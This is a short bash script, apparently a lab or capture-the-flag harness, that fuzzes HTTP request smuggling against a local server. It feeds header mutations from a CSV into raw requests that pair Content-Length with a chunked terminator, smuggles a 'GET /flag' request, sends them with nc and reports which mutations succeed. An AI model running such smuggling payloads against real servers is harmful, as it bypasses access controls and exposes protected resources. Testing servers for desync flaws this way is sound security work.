DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null 2>&1 && pwd )"

crlf () {
  printf "$1\r\n"
}

request_builder () {
  {
    crlf "GET /hello HTTP/1.1"
    crlf "Host: 0.0.0.0:8001"
    crlf "Content-Length: 47"
    crlf "${1}"
    crlf ""
    crlf "0"
    crlf ""
    crlf "GET /flag HTTP/1.1"
    crlf "Host: 0.0.0.0:8001"
    crlf ""
    crlf "GET /hello HTTP/1.1"
    crlf "Host: 0.0.0.0:8001"
    crlf ""
  }
}

while IFS=, read -r name mutation
do
  request_builder "$mutation"| nc 0.0.0.0 8001 | grep --quiet deadbeef && printf "%s\n" "💀 $name"
done < "$DIR/mutations.csv"
